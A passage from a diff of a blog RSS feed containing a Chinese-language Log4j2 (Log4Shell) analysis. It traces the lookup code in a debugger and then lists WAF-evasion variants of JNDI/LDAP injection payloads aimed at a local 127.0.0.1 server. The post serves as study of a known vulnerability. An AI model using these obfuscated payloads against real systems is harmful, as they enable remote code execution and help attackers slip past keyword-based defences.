+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;往下走，先是一个循环，遍历 &lt;/font&gt;&lt;code&gt;formatters&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; 一段一段的拼接输出的内容，不是很重要。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;两个传进去进行处理的变量，一个是 event，也就是我们 log4j2 需要来进行日志打印的内容；另外一个 buffer，我们会把打印出来的东西写进 buffer。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;跟进到&lt;/font&gt;&lt;code&gt;format&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;里后,调用栈里有两个format跟进的地方&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816645439-8ee864f2-730a-4454-a811-a5eac433e500.png&#34;
+	width=&#34;345&#34;
+	height=&#34;75&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816645439-8ee864f2-730a-4454-a811-a5eac433e500_hu2e2137ae89f3db5762e05cd95f178ec4_7427_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816645439-8ee864f2-730a-4454-a811-a5eac433e500_hu2e2137ae89f3db5762e05cd95f178ec4_7427_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;460&#34;
+		data-flex-basis=&#34;1104px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;当i=7的时候会进到第二个format里&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816730572-61128ffc-bf9f-4447-b4d7-314728d0a20a.png&#34;
+	width=&#34;1001&#34;
+	height=&#34;614&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816730572-61128ffc-bf9f-4447-b4d7-314728d0a20a_hu26ba50370da2a2a757d81f84a0ac23ff_104862_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816730572-61128ffc-bf9f-4447-b4d7-314728d0a20a_hu26ba50370da2a2a757d81f84a0ac23ff_104862_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;163&#34;
+		data-flex-basis=&#34;391px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816747555-4ae47bf8-83ca-49cc-ae17-e2d2bdda0bd1.png&#34;
+	width=&#34;950&#34;
+	height=&#34;193&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816747555-4ae47bf8-83ca-49cc-ae17-e2d2bdda0bd1_hua05d2783706e7bdb77076ca9cf833d55_38228_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816747555-4ae47bf8-83ca-49cc-ae17-e2d2bdda0bd1_hua05d2783706e7bdb77076ca9cf833d55_38228_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;492&#34;
+		data-flex-basis=&#34;1181px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里判断是不是&lt;code&gt;lookup&lt;/code&gt;,用的是,进入for循环&lt;/p&gt;
+&lt;p&gt;这个for循环是用来截取&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816913595-bd18786e-1578-4257-9963-c2fcd73d910c.png&#34;
+	width=&#34;417&#34;
+	height=&#34;38&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816913595-bd18786e-1578-4257-9963-c2fcd73d910c_hue66d084ef613596330b00ba3a4d7f253_3304_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816913595-bd18786e-1578-4257-9963-c2fcd73d910c_hue66d084ef613596330b00ba3a4d7f253_3304_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1097&#34;
+		data-flex-basis=&#34;2633px&#34;
+	
+&gt;里&lt;code&gt;${}&lt;/code&gt;里的内容&lt;/p&gt;
+&lt;p&gt;然后进入&lt;code&gt;replace&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;StrSubstitutor&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816962103-bc115bb4-0ab3-4d2d-a230-0f2c2e25e337.png&#34;
+	width=&#34;704&#34;
+	height=&#34;242&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816962103-bc115bb4-0ab3-4d2d-a230-0f2c2e25e337_hu061d7ae26ef304c85f09d2511f71764a_26293_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733816962103-bc115bb4-0ab3-4d2d-a230-0f2c2e25e337_hu061d7ae26ef304c85f09d2511f71764a_26293_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;290&#34;
+		data-flex-basis=&#34;698px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;再进入&lt;code&gt;substitute&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817035768-9cb1ec8c-b3bb-477e-aa8e-9e13d06067ea.png&#34;
+	width=&#34;859&#34;
+	height=&#34;97&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817035768-9cb1ec8c-b3bb-477e-aa8e-9e13d06067ea_hua6aa3cfb684bbda9efeb9950c5407df8_14327_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817035768-9cb1ec8c-b3bb-477e-aa8e-9e13d06067ea_hua6aa3cfb684bbda9efeb9950c5407df8_14327_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;885&#34;
+		data-flex-basis=&#34;2125px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进入&lt;code&gt;substitute&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;然后就是进入while循环,一连串的判断,循环,看不懂&lt;/p&gt;
+&lt;p&gt;知道出循环了后&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817126181-72d2ceba-8788-4d8b-80fd-dde5749e83ba.png&#34;
+	width=&#34;766&#34;
+	height=&#34;230&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817126181-72d2ceba-8788-4d8b-80fd-dde5749e83ba_hub255f56122d86f78dd2025fe6bd99165_35323_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817126181-72d2ceba-8788-4d8b-80fd-dde5749e83ba_hub255f56122d86f78dd2025fe6bd99165_35323_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;333&#34;
+		data-flex-basis=&#34;799px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733814712777-b83b8817-f994-4ca7-b4da-2308166163d1.png&#34;
+	width=&#34;827&#34;
+	height=&#34;63&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733814712777-b83b8817-f994-4ca7-b4da-2308166163d1_hu5532b249e62696412854dc81a4411fed_10122_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733814712777-b83b8817-f994-4ca7-b4da-2308166163d1_hu5532b249e62696412854dc81a4411fed_10122_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1312&#34;
+		data-flex-basis=&#34;3150px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;能看到此时&lt;code&gt;varNameExpr&lt;/code&gt;是&lt;code&gt;jndi:ldap://127.0.0.1:8085/XFaOTtBf&lt;/code&gt;,去掉了&lt;code&gt;${}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;继续跟进跳到&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817242508-2deb7522-0d17-4a4f-849b-760f0b70e376.png&#34;
+	width=&#34;832&#34;
+	height=&#34;97&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817242508-2deb7522-0d17-4a4f-849b-760f0b70e376_hu1170b8a824fc0933b8bfc85d405d2387_13692_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817242508-2deb7522-0d17-4a4f-849b-760f0b70e376_hu1170b8a824fc0933b8bfc85d405d2387_13692_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;857&#34;
+		data-flex-basis=&#34;2058px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817260847-d00a8a3d-adf6-4b79-a08e-b36c4bcc93cc.png&#34;
+	width=&#34;489&#34;
+	height=&#34;66&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817260847-d00a8a3d-adf6-4b79-a08e-b36c4bcc93cc_hu7a8a76f0f669b995c1845f8d5b54eca7_5405_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817260847-d00a8a3d-adf6-4b79-a08e-b36c4bcc93cc_hu7a8a76f0f669b995c1845f8d5b54eca7_5405_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;740&#34;
+		data-flex-basis=&#34;1778px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;varName作为参数,resolveVariable这里是解析时支持关键词有&lt;code&gt;{date, ctx, lower, upper, main, env, sys, sd, java, marker, jndi, jvmrunargs, event, bundle, map, log4j}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733815602291-37a8189d-c102-4170-a5ed-5786c4791593.png&#34;
+	width=&#34;392&#34;
+	height=&#34;115&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733815602291-37a8189d-c102-4170-a5ed-5786c4791593_huab7d3b2d20fa13503c8256f9b3ceb724_14054_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733815602291-37a8189d-c102-4170-a5ed-5786c4791593_huab7d3b2d20fa13503c8256f9b3ceb724_14054_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;340&#34;
+		data-flex-basis=&#34;818px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;像一开始试的&lt;code&gt;java:os&lt;/code&gt;,这里就有&lt;/p&gt;
+&lt;p&gt;跟进&lt;code&gt;resolveVariable&lt;/code&gt;方法&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817781712-25c541ad-a94d-4a84-bbee-443c014fbc62.png&#34;
+	width=&#34;655&#34;
+	height=&#34;224&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817781712-25c541ad-a94d-4a84-bbee-443c014fbc62_hu035b884c9ad5530429ae6c25332753f3_27465_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817781712-25c541ad-a94d-4a84-bbee-443c014fbc62_hu035b884c9ad5530429ae6c25332753f3_27465_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;292&#34;
+		data-flex-basis=&#34;701px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看到&lt;code&gt;lookup&lt;/code&gt;方法了&lt;/p&gt;
+&lt;p&gt;后续跟进也能看到的确实Jndi的lookeup方法&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817829246-d3e1990d-6224-42ca-ad91-7bb3c7cd7393.png&#34;
+	width=&#34;993&#34;
+	height=&#34;314&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817829246-d3e1990d-6224-42ca-ad91-7bb3c7cd7393_hu2bcd2f2390aa15e35d8cda902d489199_69665_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817829246-d3e1990d-6224-42ca-ad91-7bb3c7cd7393_hu2bcd2f2390aa15e35d8cda902d489199_69665_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;316&#34;
+		data-flex-basis=&#34;758px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817837248-ff835e10-0038-4b71-bbcf-b7481aa482bd.png&#34;
+	width=&#34;863&#34;
+	height=&#34;530&#34;
+	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817837248-ff835e10-0038-4b71-bbcf-b7481aa482bd_hu982c0bea1afc64e0832984057d1808c1_75872_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/1733817837248-ff835e10-0038-4b71-bbcf-b7481aa482bd_hu982c0bea1afc64e0832984057d1808c1_75872_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;162&#34;
+		data-flex-basis=&#34;390px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;小结调试&#34;&gt;小结调试
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;先判断内容中是否有&lt;code&gt;${}&lt;/code&gt;，然后截取&lt;code&gt;${}&lt;/code&gt;中的内容，得到我们的恶意payload &lt;code&gt;jndi:xxx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;后使用&lt;code&gt;:&lt;/code&gt;分割payload，通过前缀来判断使用何种解析器去&lt;code&gt;lookup&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;支持的前缀包括 &lt;code&gt;date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j&lt;/code&gt;，后续我们的绕过可能会用到这些。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;针对-waf-的常规绕过&#34;&gt;针对 WAF 的常规绕过
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;出发点是基于很多 WAF 检测是否存在 &lt;code&gt;jndi:&lt;/code&gt; 等关键词进行判断&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;1-利用分隔符和多个--绕过&#34;&gt;1. 利用分隔符和多个 &lt;code&gt;${}&lt;/code&gt; 绕过
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;logg.info(&amp;#34;${${::-J}ndi:ldap://127.0.0.1:1389/Calc}&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;2-通过-lower-和-upper-绕过&#34;&gt;2. 通过 lower 和 upper 绕过
+&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;这一点，因为我们之前说允许的字段是这一些&lt;br&gt;
+&lt;/font&gt;&lt;code&gt;date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;，其中就有 lower 和 upper&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;同时也可以利用 lower 和 upper 来进行 bypass 关键字&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;logg.info(&amp;#34;${${lower:J}ndi:ldap://127.0.0.1:1389/Calc}&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;logg.info(&amp;#34;${${upper:j}ndi:ldap://127.0.0.1:1389/Calc}&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;同时也可以利用一些特殊字符的大小写转化的问题&lt;/font&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;ı =&amp;gt; upper =&amp;gt; i (Java 中测试可行)&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;ſ =&amp;gt; upper =&amp;gt; S (Java 中测试可行)&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;İ =&amp;gt; upper =&amp;gt; i (Java 中测试不可行)&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;K =&amp;gt; upper =&amp;gt; k (Java 中测试不可行)&lt;/font&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3编码绕过&#34;&gt;3.编码绕过
+&lt;/h3&gt;&lt;p&gt;unicode编码或者hex编码&lt;/p&gt;
+&lt;h3 id=&#34;4-总结一些-payload&#34;&gt;4. 总结一些 payload
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;原始payload&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;${jndi:ldap://127.0.0.1:1234/ExportObject}&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;对应的绕过手段&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${${a:-j}ndi:ldap://127.0.0.1:1234/ExportObject};
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${${a:-j}n${::-d}i:ldap://127.0.0.1:1234/ExportObject}&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${${lower:jn}di:ldap://127.0.0.1:1234/ExportObject}&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${${lower:${upper:jn}}di:ldap://127.0.0.1:1234/ExportObject}&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1234/ExportObject}&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>Fastjson各版本绕过分析</title>
         <link>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/</link>
         <pubDate>Wed, 08 Jan 2025 14:49:50 +0800</pubDate>
